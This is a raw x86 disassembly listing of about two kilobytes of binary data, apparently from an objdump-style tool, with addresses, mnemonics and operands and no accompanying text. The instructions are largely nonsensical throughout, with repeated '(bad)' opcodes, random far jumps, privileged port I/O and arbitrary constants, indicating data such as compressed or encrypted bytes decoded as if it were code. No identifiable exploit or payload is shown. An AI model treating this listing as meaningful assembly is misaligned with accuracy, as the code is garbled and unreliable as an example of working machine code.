  42ee5e:	loope  0x42ee7f
  42ee60:	pop    ss
  42ee61:	test   esp,edi
  42ee63:	mov    bl,0x4c
  42ee65:	and    ecx,ecx
  42ee67:	(bad)  
  42ee68:	xchg   esp,eax
  42ee69:	inc    edi
  42ee6a:	adc    eax,0x206f3153
  42ee6f:	and    edx,edx
  42ee71:	adc    eax,0x88429cf5
  42ee76:	and    al,0xfc
  42ee78:	mov    edx,0xb0226a3
  42ee7d:	cmp    eax,0x71e3529f
  42ee82:	cld    
  42ee83:	push   cs
  42ee84:	cmc    
  42ee85:	in     al,dx
  42ee86:	retf   0xf398
  42ee89:	xchg   bh,bh
  42ee8b:	popf   
  42ee8c:	repz pop esp
  42ee8e:	sar    BYTE PTR [eax+eax*1],1
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	jl     0x42ef6a
  42ef02:	lea    eax,[ebp+0x1f65c]
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	pop    ds
  42ef0d:	call   DWORD PTR [ebx+edi*2+0x14]
  42ef11:	sti    
  42ef12:	xchg   ebp,eax
  42ef13:	int    0x13
  42ef15:	fadd   QWORD PTR [ebp+0x20]
  42ef18:	enter  0x9736,0xb3
  42ef1c:	lock jb 0x42ef8c
  42ef1f:	(bad)  
  42ef20:	sub    esi,ecx
  42ef22:	push   ecx
  42ef23:	jbe    0x42ef49
  42ef25:	add    al,0x52
  42ef27:	pop    esi
  42ef28:	(bad)  
  42ef29:	mov    cl,dh
  42ef2b:	cmp    DWORD PTR [esi],0xfffffff6
  42ef2e:	loope  0x42ef58
  42ef30:	push   ebp
  42ef31:	jle    0x42ef5c
  42ef33:	int3   
  42ef34:	xor    esp,ebx
  42ef36:	xor    bl,BYTE PTR [esi-0x332e75b1]
  42ef3c:	fs push esi
  42ef3e:	mov    cl,0xa9
  42ef40:	ja     0x42ef36
  42ef42:	jmp    0x42ef4b
  42ef44:	popa   
  42ef45:	mov    ecx,0x450ee410
  42ef4a:	ror    BYTE PTR [eax+0x446c488],1
  42ef50:	fadd   DWORD PTR [esi]
  42ef52:	shl    DWORD PTR [eax],1
  42ef54:	outs   dx,BYTE PTR ds:[esi]
  42ef55:	pop    ebx
  42ef56:	cmp    eax,esi
  42ef58:	cld    
  42ef59:	push   eax
  42ef5a:	rcl    DWORD PTR [eax-0x3e],1
  42ef5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef5e:	or     DWORD PTR [edi+0x1e],esi
  42ef61:	inc    BYTE PTR [esp+ebp*2+0x2d]
  42ef65:	mov    al,ds:0x90ef73a1
  42ef6a:	pop    es
  42ef6b:	jae    0x42efd3
  42ef6d:	stc    
  42ef6e:	clc    
  42ef6f:	sub    al,0x99
  42ef71:	imul   ebp,DWORD PTR [esi+0x76],0x56
  42ef75:	sub    esp,DWORD PTR [ecx-0x2ecd51ab]
  42ef7b:	or     bl,BYTE PTR ds:0xa43d1d62
  42ef81:	jmp    0x42ef27
  42ef83:	ja     0x42eff7
  42ef85:	fistp  WORD PTR [edi-0x5f2616]
  42ef8b:	cdq    
  42ef8c:	jle    0x42ef22
  42ef8e:	jmp    0xdfff:0x7001538c
  42ef95:	lock pop ss
  42ef97:	push   cs
  42ef98:	lods   al,BYTE PTR ds:[esi]
  42ef99:	add    al,BYTE PTR [edx]
  42ef9b:	leave  
  42ef9c:	mov    ecx,0xb403d8f6
  42efa1:	std    
  42efa2:	push   ecx
  42efa3:	js     0x42eff2
  42efa5:	cld    
  42efa6:	add    DWORD PTR [ebp-0x1f],edi
  42efa9:	pop    eax
  42efaa:	in     eax,dx
  42efab:	push   ss
  42efac:	outs   dx,BYTE PTR ds:[esi]
  42efad:	push   0x92e6ac5e
  42efb2:	lods   eax,DWORD PTR ds:[esi]
  42efb3:	jmp    0x224ec067
  42efb8:	or     eax,0xdd9eaf7d
  42efbd:	cdq    
  42efbe:	add    al,0x99
  42efc0:	or     BYTE PTR [ecx+0x52],bl
  42efc3:	and    edx,ecx
  42efc5:	ret    0x67ee
  42efc8:	pop    ecx
  42efc9:	scas   eax,DWORD PTR es:[edi]
  42efca:	xchg   DWORD PTR [edx+ebp*2+0x27d99f00],edx
  42efd1:	mov    ah,BYTE PTR [ecx]
  42efd3:	cwde   
  42efd4:	cs mov al,0xd6
  42efd7:	repnz cmp esp,DWORD PTR [esi-0x32a3a5e4]
  42efde:	inc    ecx
  42efdf:	out    dx,al
  42efe0:	cmp    eax,DWORD PTR [eax-0x6d7d3717]
  42efe6:	imul   eax,DWORD PTR [ecx],0x77
  42efe9:	sbb    eax,0xdd9c1861
  42efee:	retf   
  42efef:	jbe    0x42f011
  42eff1:	mov    ds:0x54f63774,eax
  42eff6:	inc    ebp
  42eff7:	ins    BYTE PTR es:[edi],dx
  42eff8:	lahf   
  42eff9:	add    edx,DWORD PTR [edi-0x7a]
  42effc:	sub    BYTE PTR [eax+0x9],bh
  42efff:	mov    ah,BYTE PTR [edi-0x39]
  42f002:	leave  
  42f003:	inc    ebp
  42f004:	push   edi
  42f005:	push   ecx
  42f006:	inc    ebx
  42f007:	lahf   
  42f008:	jle    0x42f001
  42f00a:	(bad)  
  42f00b:	dec    DWORD PTR [ebx+0x4e]
  42f00e:	cdq    
  42f00f:	sbb    al,0x0
	...
  42f071:	add    BYTE PTR [eax],al
  42f073:	add    BYTE PTR [edx],dl
  42f075:	ds int 0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	sbb    DWORD PTR [ecx],0xf760e960
  42f086:	add    DWORD PTR [eax],eax
  42f088:	add    al,0x1
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	mov    dl,0x61
  42f08e:	mov    ebp,0x930d80dc
  42f093:	fnsave [esp+edx*1+0x58]
  42f097:	in     al,dx
  42f098:	mov    al,0x71
  42f09a:	cmp    DWORD PTR [ecx],edi
  42f09c:	(bad)  
  42f09d:	mov    BYTE PTR [eax],dh
  42f09f:	inc    ecx
  42f0a0:	(bad)  
  42f0a1:	jne    0x42f110
  42f0a3:	jmp    0xef30ccf2
  42f0a8:	in     al,dx
  42f0a9:	xor    ecx,edi
  42f0ab:	sub    al,0xfc
  42f0ad:	lods   al,BYTE PTR ds:[esi]
  42f0ae:	adc    dh,BYTE PTR [edi]
  42f0b0:	out    dx,eax
  42f0b1:	dec    edi
  42f0b2:	and    ebx,DWORD PTR [esp+eax*8]
  42f0b5:	push   ecx
  42f0b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f0b7:	or     DWORD PTR [edi-0x79ef0db9],eax
  42f0bd:	push   edx
  42f0be:	sbb    ch,al
  42f0c0:	pusha  
  42f0c1:	adc    eax,0x692ea3a
  42f0c6:	in     eax,0x66
  42f0c8:	xchg   esi,eax
  42f0c9:	xor    eax,0xdc0f619d
  42f0ce:	jae    0x42f0fc
  42f0d0:	fistp  QWORD PTR [ecx]
  42f0d2:	mov    ch,bl
  42f0d4:	jo     0x42f0fb
  42f0d6:	sbb    cl,cl
  42f0d8:	std    
  42f0d9:	lds    esp,FWORD PTR [ecx+eax*8+0x1372a4ea]
  42f0e0:	int    0x9d
  42f0e2:	out    dx,al
  42f0e3:	scas   al,BYTE PTR es:[edi]
  42f0e4:	rcl    DWORD PTR [ebx-0x43],cl
  42f0e7:	add    eax,0xf841145c
  42f0ec:	cmp    edi,DWORD PTR [ecx-0x34fdb1a8]
  42f0f2:	imul   esi,ecx,0x20
  42f0f5:	lods   al,BYTE PTR ds:[esi]
  42f0f6:	bound  eax,QWORD PTR [eax+0x26]
  42f0f9:	call   0xa4392d81
  42f0fe:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f100:	adc    eax,0x6d12adb9
  42f105:	lock fs cwde 
  42f108:	mov    ch,0x72
  42f10a:	mov    dh,0xcb
  42f10c:	into   
  42f10d:	adc    eax,0x216c2531
  42f112:	adc    edi,edi
  42f114:	add    DWORD PTR [ebx+esi*1-0x5f49ba68],esi
  42f11b:	add    DWORD PTR [edi],ebx
  42f11d:	jns    0x42f186
  42f11f:	mov    ebx,0x9402e295
  42f124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f125:	test   eax,0xe17edc19
  42f12a:	mov    ch,0xc9
  42f12c:	mov    dl,0xc9
  42f12e:	retf   
  42f12f:	push   edi
  42f130:	add    al,0x89
  42f132:	sahf   
  42f133:	in     al,dx
  42f134:	rcl    DWORD PTR [ebp+0x2e6dae1],1
  42f13a:	sub    al,0x33
  42f13c:	cs inc eax
  42f13e:	sub    eax,0x52f73a14
  42f143:	xor    BYTE PTR [ebx-0x1e921a47],cl
  42f149:	sub    BYTE PTR [eax+esi*4+0x2f],cl
  42f14d:	fwait
  42f14e:	hlt    
  42f14f:	xor    ah,BYTE PTR [edi]
  42f151:	dec    ecx
  42f152:	dec    esp
  42f153:	test   al,0x7f
  42f155:	and    BYTE PTR [edi],cl
  42f157:	mov    BYTE PTR [ebp+0x5195f673],bh
  42f15d:	in     al,dx
  42f15e:	jge    0x42f1d2
  42f160:	add    ah,0x45
  42f163:	dec    ecx
  42f164:	xor    al,0xf7
  42f166:	dec    esp
  42f167:	call   0xc1588ea6
  42f16c:	xor    edx,DWORD PTR [ecx]
  42f16e:	popa   
  42f16f:	dec    edx
  42f170:	enter  0x2c44,0x78
  42f174:	dec    esi
  42f175:	pop    ss
  42f176:	pop    edi
  42f177:	popf   
  42f178:	or     al,0x4b
  42f17a:	sub    esi,esp
  42f17c:	or     DWORD PTR [ecx],eax
  42f17e:	add    al,0xc4
  42f180:	jbe    0x42f116
  42f182:	pop    ss
  42f183:	fisub  DWORD PTR [edi+0x69]
  42f186:	das    
  42f187:	fldenv [esi]
  42f189:	push   0x1d
  42f18b:	jne    0x42f166
  42f18d:	je     0x42f1cc
  42f18f:	arpl   WORD PTR [eax],ax
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	retf   
  42f201:	bound  esi,QWORD PTR [ecx+0x1f864e7]
  42f207:	add    BYTE PTR [ecx+eax*1],al
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	adc    DWORD PTR [esp+ebx*4-0x13e1e95b],ebx
  42f213:	adc    DWORD PTR [esi],esp
  42f215:	dec    edi
  42f216:	idiv   BYTE PTR [ebx*1+0x903cf0b]
  42f21d:	jb     0x42f284
  42f21f:	sub    eax,0xb182fb8b
  42f224:	cmp    esp,eax
  42f226:	dec    ebp
  42f227:	cmc    
  42f228:	dec    ecx
  42f229:	mov    edi,0xbdd7f86
  42f22e:	popf   
  42f22f:	outs   dx,DWORD PTR ds:[esi]
  42f230:	sub    eax,0x73bad2ae
  42f235:	cwde   
  42f236:	cli    
  42f237:	push   ebp
  42f238:	jne    0x42f211
  42f23a:	ins    DWORD PTR es:[edi],dx
  42f23b:	rcl    DWORD PTR [ecx],1
  42f23d:	lds    ebp,FWORD PTR [eax]
  42f23f:	sub    DWORD PTR [esi-0x72],0x1b484461
  42f246:	xlat   BYTE PTR ds:[ebx]
  42f247:	mov    ds:0x51009943,al
  42f24c:	mov    WORD PTR [ebp+0x54],ss
  42f24f:	stos   BYTE PTR es:[edi],al
  42f250:	xor    eax,0xf91b149f
  42f255:	mul    dh
  42f257:	push   ds
  42f258:	daa    
  42f259:	fdivr  QWORD PTR [eax]
  42f25b:	push   DWORD PTR [edx+0x59168946]
  42f261:	xchg   edi,eax
  42f262:	(bad)  
  42f263:	jbe    0x42f2c6
  42f265:	jg     0x42f24b
  42f267:	mov    al,ds:0x13f174b0
  42f26c:	fiadd  DWORD PTR [edx-0x6b]
  42f26f:	aas    
  42f270:	sbb    DWORD PTR [esi],edx
  42f272:	xchg   BYTE PTR ds:0x5458d038,ah
  42f278:	pop    es
  42f279:	dec    edi
  42f27a:	or     cl,ah
  42f27c:	adc    DWORD PTR [edx],eax
  42f27e:	dec    ebx
  42f27f:	adc    ebx,DWORD PTR [ecx+0x77dc2219]
  42f285:	scas   al,BYTE PTR es:[edi]
  42f286:	cmc    
  42f287:	in     al,0x54
  42f289:	mov    eax,0x3636e24
  42f28e:	rcr    BYTE PTR [eax-0x4c92d32b],cl
  42f294:	cmp    cl,BYTE PTR [ebx-0x74]
  42f297:	or     DWORD PTR ds:[ebx+0x6],esi
  42f29b:	ins    BYTE PTR es:[edi],dx
  42f29c:	dec    ebp
  42f29d:	push   edx
  42f29e:	imul   ecx,DWORD PTR [ecx],0x96092deb
  42f2a4:	sub    eax,0x4bccc70c
  42f2a9:	and    edx,DWORD PTR [edi+0x644d2926]
  42f2af:	mov    esp,0x8ee3c1cf
  42f2b4:	dec    ebx
  42f2b5:	out    0x2b,eax
  42f2b7:	stos   BYTE PTR es:[edi],al
  42f2b8:	mov    esi,DWORD PTR [esi+0x46c02c72]
  42f2be:	pop    ecx
  42f2bf:	fnstenv [ebx-0x60]
  42f2c2:	xor    BYTE PTR [edi],dl
  42f2c4:	mov    ah,0xf
  42f2c6:	pop    esi
  42f2c7:	adc    BYTE PTR ds:0xbee96367,0xe1
  42f2ce:	pop    ecx
  42f2cf:	mov    ds:0x5a00d1f0,eax
  42f2d4:	xor    bh,0xff
  42f2d7:	shr    DWORD PTR [esi-0x780609c5],0x4f
  42f2de:	inc    ebp
  42f2df:	sub    cl,cl
  42f2e1:	pop    esp
  42f2e2:	in     al,0xea
  42f2e4:	out    dx,al
  42f2e5:	and    esp,DWORD PTR [edi+0x49dee1f7]
  42f2eb:	push   0xe8498b2a
  42f2f0:	sbb    eax,0x32975210
  42f2f5:	pop    ss
  42f2f6:	jp     0x42f33d
  42f2f8:	scas   al,BYTE PTR es:[edi]
  42f2f9:	bound  eax,QWORD PTR [edi-0x7324f8bf]
  42f2ff:	je     0x42f283
  42f301:	add    eax,DWORD PTR [esi+0xf6378a7]
  42f307:	rcl    DWORD PTR [edx],0xf6
  42f30a:	retf   0x7d88
  42f30d:	push   edx
  42f30e:	mov    eax,0xea
	...
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	(bad)  
  42f381:	into   
  42f382:	aas    
  42f383:	pop    es
  42f384:	push   0x40001f9
  42f389:	add    DWORD PTR [eax],eax
  42f38b:	add    BYTE PTR [ebx],bh
  42f38d:	mov    eax,ss
  42f38f:	dec    esp
  42f390:	ret    
  42f391:	pop    eax
  42f392:	sahf   
  42f393:	push   cs
  42f394:	sbb    dl,BYTE PTR [edx+0x70]
  42f397:	xchg   BYTE PTR [esi],bl
  42f399:	or     eax,0xdb12097c
  42f39e:	sub    bh,BYTE PTR [esi+eax*4-0x61]
  42f3a2:	cmp    DWORD PTR [edx+edx*2-0x596ca0db],0xbc6f4ab8
  42f3ad:	inc    ecx
  42f3ae:	xor    BYTE PTR [eax+0x123d09e0],bl
  42f3b4:	pop    ebp
  42f3b5:	bound  esp,QWORD PTR [ebp+0xa]
  42f3b8:	or     al,0x58
  42f3ba:	sbb    DWORD PTR [edx+0x18fa149],esp
  42f3c0:	outs   dx,DWORD PTR ds:[esi]
  42f3c1:	call   0xf3e6:0x1b8ce7e
  42f3c8:	add    eax,0x1f72f6f1
  42f3cd:	push   ebp
  42f3ce:	sar    DWORD PTR [ebp-0x32],cl
  42f3d1:	sbb    ah,bl
  42f3d3:	mov    ecx,0x759f26e4
  42f3d8:	or     ebp,esi
  42f3da:	fnsave [edi+eiz*2]
  42f3dd:	pop    esi
  42f3de:	retf   0x1a51
  42f3e1:	jg     0x42f434
  42f3e3:	int    0x8a
  42f3e5:	jae    0x42f41a
  42f3e7:	lds    esi,FWORD PTR [edx-0x5e66f02]
  42f3ed:	dec    edi
  42f3ee:	outs   dx,DWORD PTR ds:[esi]
  42f3ef:	inc    ebp
  42f3f0:	iret   
  42f3f1:	jo     0x42f408
  42f3f3:	stos   BYTE PTR es:[edi],al
  42f3f4:	jb     0x42f3a3
  42f3f6:	mov    ds:0x6e1a78b3,al
  42f3fb:	mov    ebp,0xbed4b0fa
  42f400:	cmp    ch,BYTE PTR [esi-0x1b]
  42f403:	adc    DWORD PTR [esi+0x50],ecx
  42f406:	jp     0x42f47f
  42f408:	xchg   edi,eax
  42f409:	cmp    eax,0x5fc2315b
  42f40e:	add    eax,esp
  42f410:	out    0xa8,al
  42f412:	push   es
  42f413:	push   es
  42f414:	jns    0x42f3c7
  42f416:	cmove  ecx,DWORD PTR ds:0x2827b0d8
  42f41d:	int    0xbe
  42f41f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f420:	pop    eax
  42f421:	cs pop esp
  42f423:	pop    esi
  42f424:	stc    
  42f425:	pop    DWORD PTR [eax+ebp*8+0x56]
  42f429:	xchg   esp,eax
  42f42a:	push   esp
  42f42b:	mov    dh,0xf0
  42f42d:	fild   WORD PTR [edx+0x61]
  42f430:	jns    0x42f498
  42f432:	dec    ebx
  42f433:	or     DWORD PTR [edx+edx*4-0x28d925b7],edi
  42f43a:	cmp    BYTE PTR ds:0x1daa3723,ah
  42f440:	and    BYTE PTR [ebp+0x66cf0619],ch
  42f446:	and    DWORD PTR [esi+0x3add865f],0x7e7fe336
  42f450:	jo     0x42f42c
  42f452:	xor    DWORD PTR [esi+ecx*4-0x68f8d36b],ebx
  42f459:	arpl   WORD PTR [ebx+0x2bfabe43],ax
  42f45f:	pop    ecx
  42f460:	xchg   BYTE PTR [edi-0x2b],ah
  42f463:	in     eax,0xb1
  42f465:	xacquire xchg BYTE PTR [edi-0x12bf7f25],al
  42f46c:	scas   eax,DWORD PTR es:[edi]
  42f46d:	test   eax,0xc659b774
  42f472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f473:	mov    al,0xc4
  42f475:	pop    edi
  42f476:	or     edi,DWORD PTR [ecx]
  42f478:	cmp    BYTE PTR [ebp-0x5f40b201],0x1f
  42f47f:	sbb    BYTE PTR [edx-0x321c1409],bh
  42f485:	lea    esp,[ecx+0x74]
  42f488:	shl    dh,0x3f
  42f48b:	jmp    0xa5c5288a
	...
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	xor    DWORD PTR ds:0xfa6cead1,ebx
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    al,0x1
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	and    DWORD PTR [ebx-0x10af82d4],ecx
  42f512:	xor    al,0xb1
  42f514:	push   es
  42f515:	retf   
  42f516:	jnp    0x42f4cf
  42f518:	pusha  
  42f519:	mov    ch,0x8
  42f51b:	icebp  
  42f51c:	cld    
  42f51d:	imul   ebx,DWORD PTR [eax+0x528b4309],0x68
  42f524:	push   ds
  42f525:	cmp    eax,0x55ae9801
  42f52a:	xor    ch,ch
  42f52c:	pop    ds
  42f52d:	xchg   edi,eax
  42f52e:	xchg   ebp,eax
  42f52f:	adc    eax,0xb25c15f1
  42f534:	pop    eax
  42f535:	sahf   
  42f536:	mov    esp,0xf15122ae
  42f53b:	retf   0x5500
  42f53e:	out    0x22,al
  42f540:	add    DWORD PTR [esp+eiz*4],0x11
  42f544:	imul   edx,DWORD PTR [ecx],0xd1cbe79b
  42f54a:	push   ss
  42f54b:	aaa    
  42f54c:	cmp    BYTE PTR [esi+0x2558020e],ch
  42f552:	jae    0x42f582
  42f554:	(bad)  
  42f555:	xor    ch,0xef
  42f558:	xchg   BYTE PTR [esi],bh
  42f55a:	mov    eax,0xafb835b9
  42f55f:	and    DWORD PTR [edi],eax
  42f561:	ss inc ebx
  42f563:	mov    ebx,0x4635cb27
  42f568:	imul   DWORD PTR [edi+0x50]
  42f56b:	clc    
  42f56c:	jne    0x42f51a
  42f56e:	fst    QWORD PTR [ecx+0x4d]
  42f571:	push   ebx
  42f572:	(bad)  
  42f573:	lahf   
  42f574:	aas    
  42f575:	in     eax,0xaf
  42f577:	daa    
  42f578:	imul   eax,DWORD PTR [edi-0x3a],0x12
  42f57c:	dec    edx
  42f57d:	gs mov cl,0xa
  42f580:	scas   eax,DWORD PTR es:[edi]
  42f581:	ss (bad) 
  42f583:	mov    ecx,0x401a3f14
  42f588:	call   0xd8c82fd8
  42f58d:	adc    eax,0x42319a43
  42f592:	loop   0x42f52a
  42f594:	pusha  
  42f595:	push   eax
  42f596:	xchg   ebx,eax
  42f597:	sbb    al,0xd4
  42f599:	cdq    
  42f59a:	mov    ah,0xa4
  42f59c:	and    esp,ebx
  42f59e:	lods   eax,DWORD PTR ds:[esi]
  42f59f:	and    al,0xf1
  42f5a1:	sbb    DWORD PTR [ecx-0x2c1d2fc7],edx
  42f5a7:	pusha  
  42f5a8:	fucom  st(6)
  42f5aa:	retf   0xad0a
  42f5ad:	test   eax,0xdf6fb91d
  42f5b2:	not    DWORD PTR [ecx]
  42f5b4:	bound  ecx,QWORD PTR [ecx]
  42f5b6:	cmp    bl,0x3e
  42f5b9:	les    edx,FWORD PTR [ebx]
  42f5bb:	imul   di,dx,0x77
  42f5bf:	cmp    ch,BYTE PTR [ecx-0x9da1bf4]
  42f5c5:	or     cl,al
  42f5c7:	inc    ebx
  42f5c8:	cdq    
  42f5c9:	(bad)  
  42f5ca:	fcmovne st,st(3)
  42f5cc:	dec    ebx
  42f5cd:	xor    eax,0x171e28e7
  42f5d2:	jne    0x42f594
  42f5d4:	xlat   BYTE PTR ds:[ebx]
  42f5d5:	xchg   edi,eax
  42f5d6:	das    
  42f5d7:	xchg   ebx,eax
  42f5d8:	lock shl dh,0x48
  42f5dc:	adc    ebp,esi
  42f5de:	cmp    BYTE PTR [ecx+0x74],ch
  42f5e1:	mov    cl,0x9
  42f5e3:	sbb    al,0x81
  42f5e5:	out    dx,eax
  42f5e6:	sub    BYTE PTR [ebp+0x5],0x13
  42f5ea:	js     0x42f5df
  42f5ec:	rcr    BYTE PTR [edx],1
  42f5ee:	cmc    
  42f5ef:	adc    eax,0x13063c00
  42f5f4:	imul   ecx,ebx,0x279ad9b9
  42f5fa:	xor    cl,BYTE PTR [ecx+0x19634e1c]
  42f600:	mov    ds:0x738969aa,eax
  42f605:	and    ah,BYTE PTR cs:[ecx-0x406f3b57]
  42f60c:	stos   DWORD PTR es:[edi],eax
  42f60d:	pop    es
  42f60e:	popf   
  42f60f:	jle    0x42f611
	...
  42f671:	add    BYTE PTR [eax],al
  42f673:	add    BYTE PTR [esi],bh
  42f675:	push   esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	cld    
  42f681:	push   cs
  42f682:	adc    bl,BYTE PTR [esi]
  42f684:	jo     0x42f681
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	cmp    bl,ah
  42f68e:	xchg   esp,eax
  42f68f:	inc    ebx
  42f690:	add    BYTE PTR [edi],ch
  42f692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f693:	xor    BYTE PTR [ebx+ecx*1],bh
  42f696:	sahf   
  42f697:	fidivr WORD PTR [edx+edx*8]
  42f69a:	mov    eax,ds:0x5d6e12c5
  42f69f:	mov    dl,BYTE PTR [eax+0x53]
  42f6a2:	push   ecx
  42f6a3:	mov    bh,0xf8
  42f6a5:	cdq    
  42f6a6:	push   esp
  42f6a7:	add    dh,BYTE PTR [ebx-0x71]
  42f6aa:	dec    ebx
  42f6ab:	jecxz  0x42f6e2
  42f6ad:	popf   
  42f6ae:	jmp    0x1b44:0xbbcff71c
  42f6b5:	in     eax,0x80
  42f6b7:	jp     0x42f68e
  42f6b9:	jmp    0x8b3c:0xb7d30ebe
  42f6c0:	seta   BYTE PTR [esi]
  42f6c3:	mov    ds:0xdf6be844,al
  42f6c8:	push   edx
  42f6c9:	dec    edx
  42f6ca:	dec    edi
  42f6cb:	pop    ecx
  42f6cc:	pop    esi
  42f6cd:	jno    0x42f6a9
  42f6cf:	inc    eax
  42f6d0:	fmulp  st(7),st
  42f6d2:	and    eax,0x357bc8fd
  42f6d7:	sub    esi,ecx
  42f6d9:	mov    al,0x1d
  42f6db:	arpl   WORD PTR [ebp+0x56],bx
  42f6de:	xor    bl,0x8c
  42f6e1:	mov    dl,0x5d
  42f6e3:	sub    eax,DWORD PTR [edi-0x6cc1c5af]
  42f6e9:	repnz (bad) 
  42f6ec:	pushf  
  42f6ed:	or     eax,0xaf8f8bbf
  42f6f2:	pop    edi
  42f6f3:	int    0xf3
  42f6f5:	pop    ecx
  42f6f6:	(bad)  
  42f6f7:	inc    DWORD PTR [ebp-0x59]
  42f6fa:	lahf   
  42f6fb:	idiv   dl
  42f6fd:	lods   eax,DWORD PTR ds:[esi]
  42f6fe:	(bad)  
  42f6ff:	dec    eax
  42f700:	cmp    BYTE PTR [edi+eax*2+0x429b7978],0x8d
  42f708:	es test eax,0xd3da07
  42f70e:	cli    
  42f70f:	call   FWORD PTR [edi+0x69]
  42f712:	std    
  42f713:	test   BYTE PTR [edx],al
  42f715:	mov    ch,0x4
  42f717:	hlt    
  42f718:	neg    DWORD PTR [ecx+0x39]
  42f71b:	ret    0x7811
  42f71e:	add    BYTE PTR [edi+0x4bb94859],bl
  42f724:	shl    BYTE PTR [ecx+0x63],cl
  42f727:	pusha  
  42f728:	mov    cs,ebx
  42f72a:	or     eax,DWORD PTR ds:0x58152e8b
  42f730:	mov    ah,0x7f
  42f732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f733:	mov    al,0x21
  42f736:	clc    
  42f737:	mov    ah,0x30
  42f739:	adc    eax,0xa1294cc3
  42f73e:	pop    esi
  42f73f:	gs icebp 
  42f741:	std    
  42f742:	lea    esi,[ecx-0x34ce9fc2]
  42f748:	lock ja 0x42f73e
  42f74b:	add    dl,BYTE PTR [edi+0x53c8b904]
  42f751:	mov    dl,0x41
  42f753:	cmp    al,0x1d
  42f755:	inc    esi
  42f756:	inc    ecx
  42f757:	dec    ebx
  42f758:	js     0x42f79a
  42f75a:	sub    esp,DWORD PTR [edi-0x34522b20]
  42f760:	mov    ch,0xd7
  42f762:	loope  0x42f71a
  42f764:	xor    eax,0x65913227
  42f769:	mov    esp,0x2341f53a
  42f76e:	cli    
  42f76f:	ror    DWORD PTR [edi+0xfbaa94e],cl
  42f775:	pop    ebp
  42f776:	xchg   edi,eax
  42f777:	cs xchg ebx,eax
  42f779:	ja     0x42f7c6
  42f77b:	fsubrp st(2),st
  42f77d:	adc    ch,ah
  42f77f:	mov    bh,0x7e
  42f781:	fbld   TBYTE PTR [edx-0x3af94d56]
  42f787:	retf   
  42f788:	adc    BYTE PTR [ebx-0x1b],0x79
  42f78c:	das    
  42f78d:	ret    0x99da
	...
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0x9c7ba928
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	mov    ebp,0x116c7204
  42f811:	sub    eax,0x295038d8
  42f816:	mov    ds:0xede4f443,al
  42f81b:	in     al,dx
  42f81c:	push   0xe691d07a
  42f821:	pop    esp
  42f822:	idiv   ebx
  42f824:	mov    al,ds:0xd007f4
  42f829:	dec    ebx
  42f82a:	sbb    DWORD PTR [edx+0x1fed6511],0xffffff8c
  42f831:	fdivr  st,st(2)
  42f833:	lods   eax,DWORD PTR ds:[esi]
  42f834:	xchg   ebx,eax
  42f835:	nop
  42f836:	ret    0x26da
  42f839:	sub    ebp,DWORD PTR [edx]
  42f83b:	mov    esi,0x696b2aaf
  42f840:	or     DWORD PTR [eax+esi*2-0x43],ebx
  42f844:	or     DWORD PTR [ebp-0x756a67cb],0x21ba51db
  42f84e:	lock in eax,0xb6
  42f851:	cmp    eax,0x4e146e2d
  42f856:	aam    0x1a
  42f858:	out    0x60,eax
  42f85a:	es je  0x42f8be
  42f85d:	dec    ebx
  42f85e:	sbb    ah,ch
  42f860:	and    BYTE PTR [edi+0x62],al
  42f863:	sbb    eax,esp
  42f865:	pop    ebx
  42f866:	cld    
  42f867:	out    0x97,al
  42f869:	test   BYTE PTR [ecx-0x5501dc5e],0x85
  42f870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f871:	hlt    
  42f872:	mov    al,0x7c
  42f874:	mov    al,ds:0x24415fbd
  42f879:	adc    DWORD PTR [edi],0xffffffed
  42f87c:	mov    ds:0xf8d59323,eax
  42f882:	xor    ah,BYTE PTR [esi+0x3f]
  42f885:	or     eax,DWORD PTR [edx+0x3b11f537]
  42f88b:	or     ebx,esp
  42f88d:	(bad)  
  42f88e:	add    ebp,eax
  42f890:	sbb    dl,0xa7
  42f893:	stos   DWORD PTR es:[edi],eax
  42f894:	mov    ds,WORD PTR [ebp+0x392dbd89]
  42f89a:	mov    ch,0x17
  42f89c:	mov    esp,edx
  42f89e:	dec    esp
